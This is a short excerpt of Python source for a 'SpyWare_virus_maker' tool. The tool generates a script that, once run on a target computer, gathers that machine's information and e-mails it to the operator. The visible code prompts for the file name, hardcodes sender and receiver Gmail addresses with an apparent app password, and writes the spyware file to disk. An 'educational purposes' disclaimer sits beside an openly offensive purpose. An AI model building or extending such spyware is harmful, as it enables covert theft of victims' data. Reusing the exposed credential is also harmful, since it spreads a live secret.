...
tprint("SpyWare_virus_maker")
print("""
[+] by lmcteam206
[+] this tool is for educational propuses only
[+] Write the name of the spyWare virus then a file well created with .py extention run it on the target pc and it will send all the information of this computer to you by E-mail

""")


file_name = input("Enter the virus name: ")
...
sender_email = 'lmcteam206@gmail.com'
reciever_email = 'lmcteam206@gmail.com'
sender_password = 'ystb aoci etim bqxt'
...
# Write the virus script to a file
file_file_path = f"{file_name}.py"
with open(file_file_path, "w") as file_file:
    file_file.write(file_script)
